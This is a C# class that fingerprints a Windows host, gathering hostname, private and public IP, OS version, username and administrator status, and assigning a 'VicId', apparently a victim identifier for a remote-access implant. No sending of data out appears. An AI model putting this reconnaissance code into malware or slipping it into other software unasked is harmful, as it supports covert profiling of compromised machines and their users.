using System;
using System.Net;
using System.Security.Principal;

class SystemInfo
{
    private const string PUBLIC_IP_API = "https://api.ipify.org";

    public string Hostname { get; set; }
    public string IpPriv { get; set; }
    public string IpPub { get; set; }
    public string OsVersion { get; set; }
    public string Machine { get; set; }
    public string VicId { get; set; }
    public string Username { get; set; }
    public bool IsAdmin { get; set; }

    public SystemInfo()
    {
        Hostname = Environment.MachineName;
        IpPriv = GetPrivateIp();
        IpPub = GetPublicIp();
        OsVersion = Environment.OSVersion.VersionString;
        Machine = Environment.Is64BitOperatingSystem ? "x64" : "x86";
        VicId = Guid.NewGuid().ToString();
        Username = Environment.UserName;
        IsAdmin = CheckIfAdmin();
    }

    private string GetPrivateIp()
    {
        try
        {
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var ip in host.AddressList)
            {
                if (ip.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                {
                    return ip.ToString();
                }
            }
            return "N/A";
        }
        catch (Exception)
        {
            return "N/A";
        }
    }

    private string GetPublicIp()
    {
        try
        {
            using (var webClient = new WebClient())
            {
                return webClient.DownloadString(PUBLIC_IP_API).Trim();
            }
        }
        
        catch (Exception )
        {
            return "N/A";
        }
    }

    private bool CheckIfAdmin()
    {
        try
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }
        catch (Exception)
        {
            return false;
        }
    }
}